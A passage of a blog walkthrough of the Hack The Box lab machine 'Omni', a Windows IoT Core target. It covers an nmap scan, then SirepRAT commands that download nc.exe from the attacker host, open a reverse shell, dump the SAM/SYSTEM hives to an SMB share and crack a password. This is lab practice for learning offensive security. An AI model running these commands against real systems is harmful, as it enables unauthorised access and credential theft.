@@ -1,0 +1,1509 @@
+
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="IOT,easy,SirepRAT," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Girish K" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="">
+<meta name="keywords" content="IOT, easy, SirepRAT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack The Box - Omni">
+<meta property="og:url" content="http://localhost:4000/hackthebox/2021/01/09/HTB-Omni/">
+<meta property="og:site_name" content="Girish K">
+<meta property="og:description" content="">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%201.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%202.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%203.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%204.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%205.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%206.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%207.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2010.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2011.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2012.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2013.png">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hack The Box - Omni">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled.png">
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://localhost:4000/"/>
+
+
+
+
+
+  <title>Hack The Box - Omni | Girish K</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Girish K</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Cybersecurity Enthusiast | Pentester and Programmer | Visual Artist</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+<div id="posts" class="posts-expand">
+  
+  
+
+  
+
+  
+  
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/hackthebox/2021/01/09/HTB-Omni/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Girish">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="assets/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Girish K">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+          
+          
+            Hack The Box - Omni
+          
+        </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-09T00:00:00+05:30">
+                2021-01-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/#/HackTheBox" itemprop="url" rel="index">
+                    <span itemprop="name">HackTheBox</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+            
+                <div class="post-description">
+                    
+                </div>
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+  <p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled.png" /></p>
+
+<p>Link: <a href="https://www.hackthebox.eu/home/machines/profile/271">https://www.hackthebox.eu/home/machines/profile/271</a></p>
+
+<p>Let’s Begin with our Initial Nmap Scan.</p>
+
+<h2 id="nmap-scan-results">Nmap Scan Results</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_  Basic <span class="nv">realm</span><span class="o">=</span>Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn<span class="s1">'t have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port29820-TCP:V=7.80%I=7%D=8/23%Time=5F426145%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,"
+SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x0
+SF:4G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\x
+SF:c9}\xc8O\x12");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP (86%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp2
+Aggressive OS guesses: Microsoft Windows XP SP2 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT       ADDRESS
+1   206.35 ms 10.10.14.1
+2   206.28 ms 10.10.10.204
+</span></code></pre></div></div>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+
+<p>Started with the webservice running on Port 8080. Checking that reveals its a <strong>Windows Device Portal.</strong></p>
+
+<p>And it’s asking for Username and Password. I tried some default credentials and none worked.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%201.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%201.png" /></p>
+
+<blockquote>
+  <p>What is Windows Device Portal? 
+The Windows Device Portal lets you configure and manage your device remotely over a network or USB connection. … Windows Device Portal is a web server on your device that you can connect to from a web browser on a PC. If your device has a web browser, you can also connect locally with the browser on that device. It works like an IoT.</p>
+</blockquote>
+
+<p>So I googled for default Credentials and found this. And That too didn’t work.</p>
+
+<blockquote>
+  <p><a href="https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal">https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%202.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%202.png" /></p>
+
+<h2 id="getting-shell">Getting Shell</h2>
+
+<p>Next, I googled for any exploit available for Windows Core IOT. And Found this GitHub repo.</p>
+
+<blockquote>
+  <p><a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></p>
+</blockquote>
+
+<p>The tool will exploit Sirep Test Service which  is used to perform driver/hardware tests on the IoT device and that’s built in and running on the official images offered at Microsoft’s site. So I tested whether its working or not. I tried to ping my device and it works.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root🐺kali<span class="o">)</span>-[~/htb/boxes/omni/SirepRAT]
+└─# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput <span class="nt">--return_output</span> <span class="nt">--cmd</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">--args</span> <span class="s2">"/c ping 10.10.14.30"</span> 
+&lt;HResultResult | <span class="nb">type</span>: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | <span class="nb">type</span>: 11, payload length: 98, payload peek: <span class="s1">'Pinging 10.10.14.30 with 32 bytes of data:Repl'</span><span class="o">&gt;</span>
+&lt;OutputStreamResult | <span class="nb">type</span>: 11, payload length: 52, payload peek: <span class="s1">'Reply from 10.10.14.30: bytes=32 time=757ms TTL=63'</span><span class="o">&gt;</span>
+&lt;OutputStreamResult | <span class="nb">type</span>: 11, payload length: 52, payload peek: <span class="s1">'Reply from 10.10.14.30: bytes=32 time=456ms TTL=63'</span><span class="o">&gt;</span>
+&lt;OutputStreamResult | <span class="nb">type</span>: 11, payload length: 249, payload peek: <span class="s1">'Reply from 10.10.14.30: bytes=32 time=203ms TTL=63'</span><span class="o">&gt;</span>
+&lt;ErrorStreamResult | <span class="nb">type</span>: 12, payload length: 4, payload peek: <span class="s1">''</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Time to Get Shell, In first Command I uploaded the <code class="language-plaintext highlighter-rouge">nc.exe</code> and in next command I tried to run it but I get some compatible error.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root🐺kali<span class="o">)</span>-[~/htb/boxes/omni/SirepRAT]
+└─# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput <span class="nt">--return_output</span> <span class="nt">--cmd</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">--args</span> <span class="s2">"/c powershell.exe -command Invoke-WebRequest -Uri 'http://10.10.14.30/nc.exe' -OutFile 'C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\s</span><span class="s2">pool</span><span class="se">\d</span><span class="s2">rivers</span><span class="se">\c</span><span class="s2">olor</span><span class="se">\n</span><span class="s2">c.exe'"</span>
+&lt;HResultResult | <span class="nb">type</span>: 1, payload length: 4, HResult: 0x0&gt;
+┌──<span class="o">(</span>root🐺kali<span class="o">)</span>-[~/htb/boxes/omni/SirepRAT]
+└─# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput <span class="nt">--return_output</span> <span class="nt">--cmd</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">--args</span> <span class="s2">"/c C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\s</span><span class="s2">pool</span><span class="se">\d</span><span class="s2">rivers</span><span class="se">\c</span><span class="s2">olor</span><span class="se">\n</span><span class="s2">c.exe 10.10.14.30 1234 -e cmd.exe"</span> <span class="nt">--v</span> 
+<span class="nt">---------</span>
+This version of C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\n</span>c.exe is not compatible with the version of Windows you<span class="s1">'re running. Check your computer'</span>s system information and <span class="k">then </span>contact the software publisher.
+
+<span class="nt">---------</span>
+&lt;HResultResult | <span class="nb">type</span>: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | <span class="nb">type</span>: 11, payload length: 208, payload peek: <span class="s1">'This version of C:\windows\system32\spool\drivers\'</span><span class="o">&gt;</span>
+&lt;ErrorStreamResult | <span class="nb">type</span>: 12, payload length: 4, payload peek: <span class="s1">''</span><span class="o">&gt;</span>
+
+</code></pre></div></div>
+
+<p>So I searched for other <code class="language-plaintext highlighter-rouge">nc.exe</code> there is a lot of them in GitHub. And I got this one.</p>
+
+<blockquote>
+  <p><a href="https://github.com/int0x33/nc.exe">https://github.com/int0x33/nc.exe</a></p>
+</blockquote>
+
+<p>Used the same command and started my netcat listener.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%203.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%203.png" /></p>
+
+<p>And I got a shell. It’s weird I can’t even run <code class="language-plaintext highlighter-rouge">whoami</code></p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%204.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%204.png" /></p>
+
+<p>I enumerated all the folders and in <code class="language-plaintext highlighter-rouge">Data\Users</code> there is app and Administrator directory, where I have access on them both. While checking <code class="language-plaintext highlighter-rouge">app</code> directory I found <code class="language-plaintext highlighter-rouge">iot-admin.xml</code> and is encrypted using Powershell it uses Get-Credential, Export-CliXml, and Import-CliXml to store and retrieve username and passwords.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C is MainOS
+ Volume Serial Number is 3C37-C677
+
+ Directory of C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp
+
+08/24/2020  08:33 AM    &lt;DIR&gt;          <span class="nb">.</span>
+08/24/2020  08:33 AM    &lt;DIR&gt;          ..
+07/04/2020  07:28 PM    &lt;DIR&gt;          3D Objects
+07/04/2020  07:28 PM    &lt;DIR&gt;          Documents
+07/04/2020  07:28 PM    &lt;DIR&gt;          Downloads
+07/04/2020  07:28 PM    &lt;DIR&gt;          Favorites
+07/04/2020  08:20 PM               344 hardening.txt
+07/04/2020  08:14 PM             1,858 iot-admin.xml
+07/04/2020  07:28 PM    &lt;DIR&gt;          Music
+07/04/2020  07:28 PM    &lt;DIR&gt;          Pictures
+07/04/2020  09:53 PM             1,958 user.txt
+07/04/2020  07:28 PM    &lt;DIR&gt;          Videos
+               3 File<span class="o">(</span>s<span class="o">)</span>          4,160 bytes
+               9 Dir<span class="o">(</span>s<span class="o">)</span>   4,690,165,760 bytes free
+
+C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt;type iot-admin.xml
+<span class="nb">type </span>iot-admin.xml
+&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="o">&gt;</span>
+  &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+    &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">"UserName"</span><span class="o">&gt;</span>omni<span class="se">\a</span>dministrator&lt;/S&gt;
+      &lt;SS <span class="nv">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="o">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+</code></pre></div></div>
+
+<p>I googled about how to decrypt it and found this link and <code class="language-plaintext highlighter-rouge">$cred=Import-CliXml -Path &lt;file&gt;; $cred.GetNetworkCredential().Password</code> this is the command which helps to decrypt.</p>
+
+<blockquote>
+  <p><a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx">https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx</a></p>
+</blockquote>
+
+<p>In our case, I get some error. I can’t decrypt it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt;powershell.exe <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$cred</span><span class="s2">=Import-CliXml -Path C:</span><span class="se">\D</span><span class="s2">ata</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\a</span><span class="s2">pp</span><span class="se">\i</span><span class="s2">ot-admin.xml; </span><span class="nv">$cred</span><span class="s2">.GetNetworkCredential().Password"</span>
+powershell.exe <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$cred</span><span class="s2">=Import-CliXml -Path C:</span><span class="se">\D</span><span class="s2">ata</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\a</span><span class="s2">pp</span><span class="se">\i</span><span class="s2">ot-admin.xml; </span><span class="nv">$cred</span><span class="s2">.GetNetworkCredential().Password"</span>
+Import-CliXml : Error occurred during a cryptographic operation.
+At line:1 char:7
++ <span class="nv">$cred</span><span class="o">=</span>Import-CliXml <span class="nt">-Path</span> C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\i</span>ot-admin.xml<span class="p">;</span> <span class="nv">$cred</span>.GetN ...
++       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Clixml], Cryptographic 
+   Exception
+    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
+   ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
+ 
+You cannot call a method on a null-valued expression.
+At line:1 char:60
++ ... :<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\i</span>ot-admin.xml<span class="p">;</span> <span class="nv">$cred</span>.GetNetworkCredential<span class="o">()</span>.Password
++                                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+</code></pre></div></div>
+
+<p>I even have access to <code class="language-plaintext highlighter-rouge">Administrator</code> directory, I can read those files and they are also encrypted and I can’t decrypt them too.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>dministrator&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C is MainOS
+ Volume Serial Number is 3C37-C677
+
+ Directory of C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>dministrator
+
+08/24/2020  05:29 AM    &lt;DIR&gt;          <span class="nb">.</span>
+08/24/2020  05:29 AM    &lt;DIR&gt;          ..
+07/03/2020  11:23 PM    &lt;DIR&gt;          3D Objects
+07/03/2020  11:23 PM    &lt;DIR&gt;          Documents
+07/03/2020  11:23 PM    &lt;DIR&gt;          Downloads
+07/03/2020  11:23 PM    &lt;DIR&gt;          Favorites
+07/03/2020  11:23 PM    &lt;DIR&gt;          Music
+07/03/2020  11:23 PM    &lt;DIR&gt;          Pictures
+07/04/2020  09:48 PM             1,958 root.txt
+07/04/2020  09:48 PM             1,958 root.xml
+07/03/2020  11:23 PM    &lt;DIR&gt;          Videos
+               2 File<span class="o">(</span>s<span class="o">)</span>          3,916 bytes
+               9 Dir<span class="o">(</span>s<span class="o">)</span>   4,690,165,760 bytes free
+</code></pre></div></div>
+
+<p>I thought since we have access to Administrator directory, what about SAM and SYSTEM files? We have access to them too?</p>
+
+<p><strong>SAM - The Security Account Manager is a database file in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users’ passwords.</strong></p>
+
+<p><strong>SYSTEM - The Windows Registry is a hierarchical database that stores low-level settings for the Microsoft Windows operating system and for applications that opt to use the Registry.</strong></p>
+
+<blockquote>
+  <p><a href="https://pure.security/dumping-windows-credentials/">https://pure.security/dumping-windows-credentials/</a></p>
+</blockquote>
+
+<p>And Yes we have access to them. Copied them to the app directory. Now I need to copy this to my machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; reg.exe save hklm<span class="se">\s</span>am C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\s</span>am
+PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; reg.exe save hklm<span class="se">\s</span>ystem C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\s</span>ystem
+</code></pre></div></div>
+
+<p>I setup SMB Server in my machine.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%205.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%205.png" /></p>
+
+<p>Copied the files to my machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; net use z: <span class="se">\\</span>10.10.14.30<span class="se">\p</span>ub /user:wolf wolf
+PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; copy sam <span class="se">\\</span>10.10.14.30<span class="se">\p</span>ub
+copy sam <span class="se">\\</span>10.10.14.30<span class="se">\p</span>ub
+PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; copy system <span class="se">\\</span>10.10.14.30<span class="se">\p</span>ub
+copy system <span class="se">\\</span>10.10.14.30<span class="se">\p</span>ub
+</code></pre></div></div>
+
+<p>There are various tools to dump the hashes, I used <code class="language-plaintext highlighter-rouge">secretsdump.py</code> and I got some hashes. We are Interested in Administrator and app hashes.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%206.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%206.png" /></p>
+
+<p>I cracked the hashes using JTR and I got user <code class="language-plaintext highlighter-rouge">app</code> hash.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%207.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%207.png" /></p>
+
+<p>We know Windows Device Portal running on Port 8080 and its asking for credentials. This time I used this <code class="language-plaintext highlighter-rouge">app : mesh5143</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%208.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%208.png" /></p>
+
+<p>I logged into the dashboard. I started checking each and every tabs.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%209.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%209.png" /></p>
+
+<p>There is an option to Run Command, We have already uploaded our <code class="language-plaintext highlighter-rouge">nc64.exe</code> so I used the same one to get a shell.</p>
+
